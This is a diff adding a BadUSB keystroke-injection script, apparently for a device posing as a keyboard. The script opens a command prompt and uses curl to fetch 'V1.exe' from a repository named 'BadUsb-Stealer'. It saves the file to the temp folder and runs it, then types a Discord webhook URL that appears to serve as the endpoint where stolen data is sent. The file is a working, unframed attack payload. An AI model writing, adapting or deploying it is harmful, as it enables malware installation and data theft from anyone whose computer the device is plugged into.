@@ -1,0 +1,11 @@
+GUI r
+DELAY 100
+ENTER
+STRING cmd
+ENTER
+DELAY 100
+STRING curl -L "https://github.com/FogmaLOL/BadUsb-Stealer/raw/Keyboard.py/V1.exe" -o "%TEMP%\V1.exe" && "%TEMP%\V1.exe"
+ENTER
+DELAY 100
+STRING https://discord.com/api/webhooks/1306736715633004606/bSzyV0lK_AfqOEyginiV4CCSn32zuClnv5hdsqCR1OIIyTASDz-zuEhfnylkVBDz3pGx
+ENTER
